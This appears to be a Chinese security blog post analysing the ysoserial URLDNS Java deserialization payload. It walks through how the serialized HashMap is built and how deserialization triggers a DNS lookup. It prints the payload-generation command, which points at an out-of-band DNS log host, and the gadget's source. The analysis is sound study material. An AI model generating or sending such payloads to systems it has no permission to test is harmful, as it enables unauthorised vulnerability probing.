@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=5.1.3">
+
+
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ysoserial URLDNS 分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ysoserial URLDNS">
+<meta property="og:url" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/index.html">
+<meta property="og:site_name" content="lyxhh">
+<meta property="og:description" content="ysoserial URLDNS 分析">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_09.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_10.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_11.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_12.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_13.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_14.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_15.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_08.png">
+<meta property="og:updated_time" content="2020-12-20T06:22:33.014Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ysoserial URLDNS">
+<meta name="twitter:description" content="ysoserial URLDNS 分析">
+<meta name="twitter:image" content="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/yso_urldns_01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/"/>
+
+
+
+
+
+  <title>ysoserial URLDNS | lyxhh</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lyxhh</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lxhsec.com/2020/09/16/ysoserial-parse-urldns/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lyxhh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lyxhh">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ysoserial URLDNS</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-16T11:32:25+08:00">
+                2020-09-16
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-12-20T14:22:33+08:00">
+                2020-12-20
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>ysoserial URLDNS 分析<a id="more"></a></p>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Java反序列化漏洞 利用时，总会使用到<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">ysoserial</a>这款工具，安服仔用了很多，但是工具的原理却依旧不清不楚，当了这么久的脚本仔，是时候当一波（实习）研究仔，学习下这款工具各个Payload的原理了，下面我们先从漏洞探测模块URLDNS这个Payload开始学起，逐步衍生到漏洞利用模块。</p>
+<p>为什么URLDNS模块会发送DNSLOG请求？</p>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>下载ysoserial项目，打开pom.xml，程序入口在<code>ysoserial.GeneratePayload</code><br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_01.png" alt="yso_urldns_01"></p>
+<p>打开GeneratePayload.java，找到main方法，代码如下：<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_02.png" alt="yso_urldns_02"></p>
+<p>当我们使用ysoserial执行以下命令时：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar .\ysoserial-<span class="number">0.0</span>.6-SNAPSHOT-all.jar URLDNS <span class="string">"http://lyxhh.dnslog.cn"</span>  &gt; dnslog.ser</div></pre></td></tr></table></figure></p>
+<p>首先ysoserial获取外面传入的参数，并赋值给对应的变量。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">final</span> String payloadType = args[<span class="number">0</span>]; <span class="comment">// URLDNS</span></div><div class="line"><span class="keyword">final</span> String command = args[<span class="number">1</span>]; <span class="comment">//http://lyxhh.dnslog.cn</span></div></pre></td></tr></table></figure></p>
+<p>接着执行<code>Utils.getPayloadClass(&quot;URLDNS&quot;);</code>，根据全限定类名<code>ysoserial.payloads.URLDNS</code>，获取对应的Class类对象。<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_03.png" alt="yso_urldns_03"></p>
+<p><code>final ObjectPayload payload = payloadClass.newInstance();</code><br>然后通过反射创建Class类对应的对象，走完句代码，URLDNS对象创建完成。</p>
+<p><code>final Object object = payload.getObject(&quot;http://lyxhh.dnslog.cn&quot;);</code><br>接着执行URLDNS对象中的getObject方法。<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_04.png" alt="yso_urldns_04"></p>
+<p>getObject方法中，<br><code>URLStreamHandler handler = new SilentURLStreamHandler();</code><br>创建了URLStreamHandler对象，该对象的作用，后面我们会详细说到。</p>
+<p>接着<br><code>HashMap ht = new HashMap();</code><br>创建了HashMap对象，</p>
+<p><code>URL u = new URL(null, &quot;http://lyxhh.dnslog.cn&quot;, handler);</code><br>URL对象。</p>
+<p><code>ht.put(u, &quot;http://lyxhh.dnslog.cn&quot;);</code><br>将URL对象作为HashMap中的key，dnslog地址为值，存入HashMap中。</p>
+<p><code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code><br>通过反射机制 设置URL对象的成员变量hashCode值为-1，为什么要设置值为-1，这问题在反序列化时会详细说到。<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_05.png" alt="yso_urldns_05"></p>
+<p>将HashMap对象返回<code>return ht;</code>，接着对<strong>HashMap对象</strong>进行序列化操作<code>Serializer.serialize(object, out);</code>并将序列化的结果重定向到<code>dnslog.ser</code>文件中。<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_06.png" alt="yso_urldns_06"></p>
+<p>由于HashMap中重写了writeObject方法，因此在进行序列化操作时，执行的序列化方法是HashMap中的writeObject方法，具体如下：</p>
+<p>先执行默认的序列化操作:<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_08.png" alt="yso_urldns_08"></p>
+<p>接着 遍历HashMap，对HashMap中的key，value进行序列化。<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_09.png" alt="yso_urldns_09"></p>
+<p>综上所述，梳理下ysoserial payload，URLDNS 序列化的整个过程：</p>
+<ul>
+<li>首先 ysoserial 通过反射的方式，根据全限定类名<code>ysoserial.payloads.URLDNS</code>，获取对应的Class类对象，并通过Class类对象的<code>newInstance()</code>方法，获取URLDNS对象。</li>
+<li>接着执行URLDNS对象中的getObject方法。<ul>
+<li>在getObject方法中，创建了URLStreamHandler 对象<code>URLStreamHandler handler = new SilentURLStreamHandler();</code>，该对象会被URL对象引用。</li>
+<li>创建HashMap对象<code>HashMap ht = new HashMap();</code>，URL对象<code>URL u = new URL(null, &quot;http://lyxhh.dnslog.cn&quot;, handler);</code>。</li>
+<li>将URL对象作为HashMap中的Key，DNSLOG的地址作为HashMap中的值<code>HashMap.put(u, &quot;http://lyxhh.dnslog.cn&quot;);</code></li>
+<li>通过反射的方式<code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code>，设置URL对象中的成员变量hashCode值为-1。</li>
+<li>返回HashMap对象。</li>
+</ul>
+</li>
+<li>然后对HashMap对象进行序列化操作<code>Serializer.serialize(HashMap object, out);</code></li>
+</ul>
+<p>整个序列化过程中，有几个问题：<br>1、为什么要创建URLStreamHandler 对象，URL对象中默认的URLStreamHandler 对象不香吗。<br>2、为什么要设置URL对象中的成员变量hashCode值为-1。</p>
+<h2 id="0x03-反序列化分析"><a href="#0x03-反序列化分析" class="headerlink" title="0x03 反序列化分析"></a>0x03 反序列化分析</h2><p>读取上述操作生成的<code>dnslog.ser</code>文件，执行反序列化，触发DNSLOG请求:<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_07.png" alt="yso_urldns_07"></p>
+<p>为什么HashMap的反序列化过程会发送DNSLOG请求呢？</p>
+<p>在进行反序列化操作时，由于HashMap中重写了readObject方法，因此执行的反序列化方法是HashMap中的readObject方法，如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></div><div class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</div><div class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></div><div class="line">    s.defaultReadObject(); <span class="comment">// 执行默认的反序列化方法</span></div><div class="line">    reinitialize(); <span class="comment">//初始化变量值</span></div><div class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</div><div class="line">                                         loadFactor);</div><div class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></div><div class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></div><div class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</div><div class="line">                                         mappings);</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></div><div class="line">        <span class="comment">// Size the table using given load factor only if within</span></div><div class="line">        <span class="comment">// range of 0.25...4.0</span></div><div class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</div><div class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</div><div class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</div><div class="line">                   DEFAULT_INITIAL_CAPACITY :</div><div class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</div><div class="line">                   MAXIMUM_CAPACITY :</div><div class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</div><div class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</div><div class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</div><div class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</div><div class="line">        <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</div><div class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</div><div class="line">        table = tab;</div><div class="line"></div><div class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</div><div class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</div><div class="line">                K key = (K) s.readObject(); <span class="comment">// 遍历hashmap，进行反序列化操作，还原key值，这里的key值，是URL对象。</span></div><div class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</div><div class="line">                V value = (V) s.readObject(); <span class="comment">// 还原value值，这里的value值，是dnslog的请求地址，http://lyxhh.dnslog.cn</span></div><div class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>); <span class="comment">//对key进行hash计算，确保唯一，并构造Hashmap对象。</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>readObject中，先执行默认的反序列化方法，接着还原HashMap，并计算Key，如下：<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_10.png" alt="yso_urldns_10"></p>
+<p>这里我们跟进hash(key)方法中，<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_11.png" alt="yso_urldns_11"></p>
+<p>接着执行了<code>key.hashCode()</code>，而key是URL对象，因此执行的是URL对象中的hashCode方法，继续跟进。<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_12.png" alt="yso_urldns_12"></p>
+<p>在序列化操作时，已经通过反射设置了URL的hashCode等于-1，因此这里会直接进入到<code>handler.hashCode(this);</code>中。<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_13.png" alt="yso_urldns_13"></p>
+<p>hashCode方法中会执行<code>getHostAddress(URL u)</code>方法，方法中调用了<code>InetAddress.getByName(host);</code>函数，从而发送DNSLOG请求。<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_14.png" alt="yso_urldns_14"></p>
+<p>使用<code>InetAddress.getByName(host);</code>，发送DNSLOG请求。<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_15.png" alt="yso_urldns_15"></p>
+<p>综上所述，梳理下ysoserial payload，URLDNS 反序列化的整个过程：</p>
+<ul>
+<li>首先 HashMap 重写了readObject方法，因此在反序列化过程中，执行的反序列化方法是HashMap中的readObject方法。</li>
+<li>在HashMap中的readObject方法中，会对Key进行hash计算<code>key.hashCode()</code>，而Key是URL对象，执行URL对象的hashCode方法。</li>
+<li>在URL.hashCode方法中，当hashCode成员变量值为-1时，会执行URLStreamHandler.hashCode()方法。</li>
+<li>在URLStreamHandler.hashCode()方法中，会执行<code>getHostAddress(URL u)</code>方法。</li>
+<li>在<code>getHostAddress(URL u)</code>方法中，会执行<code>InetAddress.getByName(host);</code>，从而发送DNSLOG请求。</li>
+</ul>
+<h2 id="0x04-解决序列化时遗留的问题"><a href="#0x04-解决序列化时遗留的问题" class="headerlink" title="0x04 解决序列化时遗留的问题"></a>0x04 解决序列化时遗留的问题</h2><h3 id="1、为什么要创建URLStreamHandler-对象，URL对象中默认的URLStreamHandler-对象不香吗。"><a href="#1、为什么要创建URLStreamHandler-对象，URL对象中默认的URLStreamHandler-对象不香吗。" class="headerlink" title="1、为什么要创建URLStreamHandler 对象，URL对象中默认的URLStreamHandler 对象不香吗。"></a>1、为什么要创建URLStreamHandler 对象，URL对象中默认的URLStreamHandler 对象不香吗。</h3><p>URLDNS中getObject方法中，<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line"></div><div class="line">    URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</div><div class="line">    HashMap ht = <span class="keyword">new</span> HashMap(); </div><div class="line">    URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); </div><div class="line">    ht.put(u, url);  </div><div class="line"></div><div class="line">    Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>); </div><div class="line">    <span class="keyword">return</span> ht;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>URLStreamHandler handler = new SilentURLStreamHandler();</code>创建了URLStreamHandler 对象。</p>
+<p>这里我们先来看下SilentURLStreamHandler类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>SilentURLStreamHandler类继承URLStreamHandler，重写了openConnection，getHostAddress方法，将方法的实现置空了。</p>
+<p>然后将handler传递给了URL构造函数。<br><code>URL u = new URL(null, url, handler);</code></p>
+<p>在URL构造函数中，如果handler存在，则执行<br><code>this.handler = handler;</code></p>
+<p>接着我们执行了HashMap的put方法<code>ht.put(u, url);</code>，这里我们跟下put方法，如下：<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_01.png" alt="yso_urldns_qa_01"></p>
+<p>在put方法中，执行了hash(key)方法，我们跟进hash方法：<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_02.png" alt="yso_urldns_qa_02"></p>
+<p>跟进hashCode方法：<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_03.png" alt="yso_urldns_qa_03"></p>
+<p>URL对象初始化后，hashCode值默认为-1，<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_07.png" alt="yso_urldns_qa_07"></p>
+<p>因此第一次<code>HashMap.put</code>时，会进入<code>handler.hashCode(this)</code>，<strong>注意这里的handler是SilentURLStreamHandler的对象</strong>，跟进<code>URLStreamHandler.hashCode</code><br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_04.png" alt="yso_urldns_qa_04"></p>
+<p>在<code>URLStreamHandler.hashCode</code>中 存在getHostAddress()方法，在反序列化分析时，我们知道该方法会发送DNSLOG请求，为了让HashMap在第一次put 元素时，不执行DNSLOG请求，因此，ysoserial重写了getHostAddress方法，将该方法置为空实现。</p>
+<p>流程图对比：</p>
+<p>使用默认的URLStreamHandler。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ht.put(<span class="keyword">new</span> URL(<span class="keyword">null</span>, url), url); --&gt; </div><div class="line">	putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>) --&gt; </div><div class="line">		hash(key) --&gt; </div><div class="line">			URL.hashCode() --&gt;  </div><div class="line">				URLStreamHandler.hashCode(<span class="keyword">this</span>) --&gt; </div><div class="line">					URLStreamHandler.getHostAddress(u) --&gt; 发送DNSLog请求</div></pre></td></tr></table></figure></p>
+<p>使用重写的SilentURLStreamHandler。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</div><div class="line">ht.put(<span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler), url); --&gt; </div><div class="line">	putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>) --&gt; </div><div class="line">		hash(key) --&gt; </div><div class="line">			URL.hashCode() --&gt;  </div><div class="line">				URLStreamHandler.hashCode(<span class="keyword">this</span>) --&gt; </div><div class="line">					SilentURLStreamHandler.getHostAddress(u) --&gt; 空实现。</div></pre></td></tr></table></figure></p>
+<p><code>transient URLStreamHandler handler;</code><br>由于handler的类型是transient，被transient修饰的变量在序列化时，不会被存储，因此不影响反序列化链的触发。（反序列化时，handler是默认的，没有将getHostAddress方法置空，依旧可以执行DNSLOG请求）</p>
+<p>SilentURLStreamHandler重写的openConnection函数，经过分析在URLDNS中并没有使用到，之所以存在是因为SilentURLStreamHandler类继承URLStreamHandler抽象类，必须实现该抽象类中的所有抽象方法。<br><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_05.png" alt="yso_urldns_qa_05"></p>
+<p>小结：<br>URLDNS通过URL构造函数 传递 SilentURLStreamHandler类对象，该类重写了getHostAddress方法，将方法体置为空实现，旨在执行HashMap.put时，不会触发DNSLOG请求，降低对目标漏洞的误判率。</p>
+<h3 id="2、为什么要设置URL对象中的成员变量hashCode值为-1。"><a href="#2、为什么要设置URL对象中的成员变量hashCode值为-1。" class="headerlink" title="2、为什么要设置URL对象中的成员变量hashCode值为-1。"></a>2、为什么要设置URL对象中的成员变量hashCode值为-1。</h3><p>在URL对象创建时，hashCode值默认为-1，</p>
+<p>接着进行了HashMap.put操作，计算key hash时，会执行URL.hashCode方法</p>
+<p><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_06.png" alt="yso_urldns_qa_06"></p>
+<p>执行完<code>handler.hashCode(this)</code>，会重置了hashCode成员变量的值，此时该值就不为-1了，这里我们通过反射获取 <code>经过HashMap.put后</code>的hashCode值，如下：</p>
+<p><img src="/2020/09/16/ysoserial-parse-urldns/yso_urldns_qa_08.png" alt="yso_urldns_qa_08"></p>
+<p>而hashCode变量没有被transient修饰，因此序列化时会将hashCode变量值存储进序列化数据中。</p>
+<p>在进行反序列化操作时，由于hashCode值不为-1，不会执行<code>handler.hashCode(this)</code>，从而导致无法发送DNSLOG请求。</p>
+<p>因此在执行完HashMap.put后，需要反射将hashCode的值设置了-1，以便反序列化执行时，可以正常发送DNSLOG请求。</p>
+<p>网上的分析文章，绝大部分都是分析如何触发DNSLOG，但是关于ysoserial的其他细节构造却只字不提。</p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>本文从工具的命令使用出发，由浅入深的分析了URLDNS Payload 执行序列化的过程，以及反序列化时是如何触发DNSLOG请求，接着分析了ysoserial构造URLDNS Payload 的一些必要的细节，希望我的分析可以给大家带来帮助，后续我们将继续从ysoserial工具学习更多的反序列化知识。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>穷困潦倒的安全工作者，如果文章对您有所帮助，可以选择性打赏。</div>
